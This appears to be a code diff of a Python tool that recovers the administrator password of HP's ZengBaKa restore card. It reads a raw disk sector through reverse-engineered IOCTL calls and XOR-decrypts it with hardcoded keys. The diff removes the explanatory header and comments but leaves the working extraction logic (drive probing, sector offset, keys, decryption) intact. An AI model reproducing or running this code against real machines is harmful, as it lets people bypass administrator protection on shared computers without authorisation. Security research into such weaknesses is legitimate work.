@@ -1,21 +1,3 @@
-# -*- coding: utf-8 -*-
-"""
-增霸卡 (HP ZengBaKa / 还原卡) 管理员密码读取工具 —— IOCTL 直读复现
-=================================================================
-依据:
-  PublicFun.dll  CZbkObject::ValidAdminPasswords  @ RVA 0x5280
-  PublicFun.dll  CZbkObject::Initial              @ RVA 0x3EC0
-  PublicFun.dll  CZbkObject::ReadSectors          @ RVA 0x3BC0
-
-流程:
-  1) 枚举 \\\\.\\PhysicalDriveN, IOCTL 0x72054 探测数据区基地址 LBA (8 字节)
-  2) 目标 LBA = base + 6410 (0x190A), IOCTL 0x7201C 读 1 个扇区 (原地读写)
-  3) 扇区前 4 字节 ^= 0x48414947, 次 4 字节 ^= 0x55414E47
-  4) 输出明文密码 (8 字节) / 十六进制 / 空密码哨兵判定
-
-注意: 需要管理员权限。空密码的密文特征为 ASCII "GIAHGNAU" (47 49 41 48 47 4E 41 55)。
-"""
-
 import ctypes
 import sys
 import os
@@ -28,13 +10,13 @@ FILE_SHARE_WRITE = 0x00000002
 OPEN_EXISTING = 3
 INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
 
-IOCTL_GET_LBA = 0x72054     # Initial(): 探测数据区基地址
-IOCTL_READ_SECTOR = 0x7201C  # ReadSectors(): 原地读写扇区
-IOCTL_GET_LBA2 = 0x7205C     # Initial(): 次基地址探测 (SYSPARAM[0x210] != 0)
+IOCTL_GET_LBA = 0x72054
+IOCTL_READ_SECTOR = 0x7201C
+IOCTL_GET_LBA2 = 0x7205C
 
-PWD_SECTOR_OFFSET = 6410     # 0x190A
-KEY1 = 0x48414947            # 内存小端字节序 47 49 41 48 -> 大端读出 "HAIG"
-KEY2 = 0x55414E47            # 内存小端字节序 47 4E 41 55 -> 大端读出 "UANG"
+PWD_SECTOR_OFFSET = 6410
+KEY1 = 0x48414947
+KEY2 = 0x55414E47
 SECTOR_SIZE = 512
 
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
@@ -82,7 +64,6 @@ def open_drive(index, write=True):
 
 
 def ioctl(h, code, buf, in_len, out_len):
-    """输入输出共用同一缓冲区 (与 ReadSectors 语义一致)"""
     returned = ctypes.c_uint32(0)
     ok = kernel32.DeviceIoControl(h, code, buf, in_len, buf, out_len,
                                   ctypes.byref(returned), None)
@@ -90,7 +71,6 @@ def ioctl(h, code, buf, in_len, out_len):
 
 
 def probe(index):
-    """返回 dict: 该物理盘是否承载增霸卡数据区"""
     res = {"index": index, "opened": False, "base_lba": None,
            "read_ok": False, "password": None, "raw": None, "notes": []}
 
@@ -100,11 +80,10 @@ def probe(index):
         if h is None:
             res["notes"].append("CreateFileA 失败, GetLastError=%d" % err)
             return res
-        res["notes"].append("以只读方式打开 (写权限被拒)")
+        res["notes"].append("以只读方式打开")
     res["opened"] = True
 
     try:
-        # ---- 步骤 1: 探测数据区基地址 ----
         buf = ctypes.create_string_buffer(8)
         ok, ret, err = ioctl(h, IOCTL_GET_LBA, buf, 8, 8)
         if not ok:
@@ -117,7 +96,6 @@ def probe(index):
         if not res["base_lba"]:
             return res
 
-        # ---- 步骤 2: 读 base+6410 扇区 ----
         target = res["base_lba"] + PWD_SECTOR_OFFSET
         sbuf = ctypes.create_string_buffer(SECTOR_SIZE)
         hdr = target.to_bytes(8, "little") + (1).to_bytes(8, "little")
@@ -130,7 +108,6 @@ def probe(index):
         res["read_ok"] = True
         res["raw"] = raw
 
-        # ---- 步骤 3: 双密钥异或解密 ----
         b = bytearray(sbuf.raw[:SECTOR_SIZE])
         k1 = KEY1.to_bytes(4, "little")
         k2 = KEY2.to_bytes(4, "little")
@@ -140,7 +117,6 @@ def probe(index):
         res["password_full"] = bytes(b[:8])
         res["sector"] = bytes(b)
 
-        # ---- 步骤 4: 明文解释 ----
         pwd = bytes(b[:8]).split(b"\x00")[0]
         res["password"] = pwd
     finally:
